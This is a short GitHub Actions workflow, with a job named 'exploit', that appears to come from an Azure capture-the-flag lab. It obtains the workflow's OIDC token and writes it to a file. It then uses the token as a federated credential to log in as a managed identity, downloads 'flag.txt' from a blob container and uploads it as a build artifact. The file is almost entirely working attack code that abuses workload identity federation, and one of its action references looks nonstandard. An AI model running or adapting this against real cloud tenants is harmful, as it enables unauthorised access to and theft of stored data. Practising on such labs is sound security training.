name: blob-access

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Get OIDC token
        id: oidc
        uses: actions/github-script@v6
        with:
          script: |
            const id_token = await core.getIDToken("api://AzureADTokenExchange");
            require('fs').writeFileSync('oidc_token.txt', id_token);

      - name: Install Azure CLI
        uses: azure/setup-azure@v3

      - name: Azure login
        run: |
          az login --service-principal \
            --username <UAMI_CLIENT_ID> \
            --tenant <TENANT_ID> \
            --federated-token "$(cat oidc_token.txt)"

      - name: Download flag
        run: |
          az storage blob download \
            --account-name iamazurelab3d26800f7 \
            --container-name flag \
            --name flag.txt \
            --file flag.txt \
            --auth-mode login

      - name: Upload flag artifact
        uses: actions/upload-artifact@v3
        with:
          name: flag
          path: flag.txt
